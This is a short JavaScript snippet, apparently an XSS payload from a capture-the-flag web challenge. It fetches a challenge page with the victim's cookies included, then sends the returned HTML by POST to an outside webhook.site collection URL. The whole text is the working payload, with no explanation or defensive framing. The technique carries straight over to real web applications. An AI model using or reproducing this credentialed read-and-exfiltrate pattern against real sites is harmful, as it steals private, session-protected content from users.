fetch("https://chall.nckuctf.org:28127/", {
  credentials: "include"
})
  .then(res => res.text())
  .then(html => {
    fetch("https://webhook.site/45b7f639-1bad-4e43-add9-ab366290349a", {
      method: "POST",
      mode: "no-cors",
      body: html
    });
  });
